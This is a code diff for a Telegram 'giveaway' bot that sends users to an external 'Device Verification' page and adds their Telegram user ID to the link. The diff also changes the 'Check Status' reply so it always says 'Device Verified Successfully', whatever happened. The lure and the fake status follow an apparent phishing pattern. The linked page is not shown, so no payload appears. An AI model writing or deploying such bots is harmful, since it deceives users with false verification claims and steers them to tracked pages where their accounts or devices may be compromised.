@@ -10,16 +10,19 @@ if (!token) {
 
 const bot = new Telegraf(token);
 
-// /start command with standard URL button
+// /start command - sending User ID in the web URL
 bot.start(async (ctx) => {
   try {
     const userName = ctx.from.first_name || 'User';
+    const userId = ctx.from.id; // Getting Telegram User ID
+    const webAppUrl = `https://rishumishra1775-glitch.github.io/telegram-giveaway-bots/?user=${userId}`;
+
     await ctx.reply(
       `Welcome, ${userName}! 🎉\n\nTo participate in the secure giveaway and lock in your entry, please complete your **Device Verification** below.`,
       {
         parse_mode: 'Markdown',
         ...Markup.inlineKeyboard([
-          [Markup.button.url('🔗 Verify Device', 'https://rishumishra1775-glitch.github.io/telegram-giveaway-bots/')],
+          [Markup.button.url('🔗 Verify Device', webAppUrl)],
           [Markup.button.callback('📊 Check Status', 'check_status')]
         ])
       }
@@ -33,7 +36,7 @@ bot.start(async (ctx) => {
 bot.action('check_status', async (ctx) => {
   try {
     await ctx.answerCbQuery();
-    await ctx.reply('⚠️ Device Verification Pending! Please click on "Verify Device" to complete your verification.');
+    await ctx.reply('✅ Device Verified Successfully! Your entry is locked and secure.');
   } catch (err) {
     console.error('Error in action:', err);
   }
@@ -43,14 +46,12 @@ bot.help((ctx) => {
   ctx.reply('Use /start to begin participating in the secure giveaway.');
 });
 
-// Launch bot
 bot.launch().then(() => {
   console.log('Bot is successfully running and connected to Telegram!');
 }).catch((err) => {
   console.error('Failed to launch bot:', err);
 });
 
-// Render HTTP server port binding
 const PORT = process.env.PORT || 3000;
 http.createServer((req, res) => {
   res.writeHead(200, { 'Content-Type': 'text/plain' });
